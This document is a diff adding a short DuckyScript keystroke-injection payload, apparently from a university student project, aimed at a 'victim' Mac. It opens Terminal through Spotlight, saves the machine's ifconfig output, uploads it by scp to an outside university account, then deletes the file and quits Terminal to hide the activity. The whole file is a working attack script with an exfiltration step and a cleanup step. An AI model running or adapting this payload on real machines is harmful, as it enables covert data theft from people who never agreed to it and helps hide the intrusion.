@@ -1,0 +1,33 @@
+REM Copying network interface information about victim computer and uploading onto my CSE machine
+
+REM Demonstration: https://www.youtube.com/watch?v=v3thzkZJL98
+
+REM Open spotlight search
+DELAY   1000
+GUI     SPACE
+DELAY   1000
+
+REM Open terminal from spotlight search
+STRING  terminal
+ENTER
+DELAY   500
+
+REM Put 'ifconfig' informatino into 'intscan.txt'
+STRING  ifconfig > intscan.txt
+ENTER
+DELAY   1000
+
+REM Uploading onto my CSE machine
+STRING  scp intscan.txt z5117148@cse.unsw.edu.au:~/Documents
+ENTER
+
+REM Wait until the upload has completely finished
+DELAY   10000
+
+REM Delete intscan.txt off victim's computer
+STRING  rm intscan.txt
+ENTER
+DELAY   200
+
+REM Quit terminal
+GUI     q
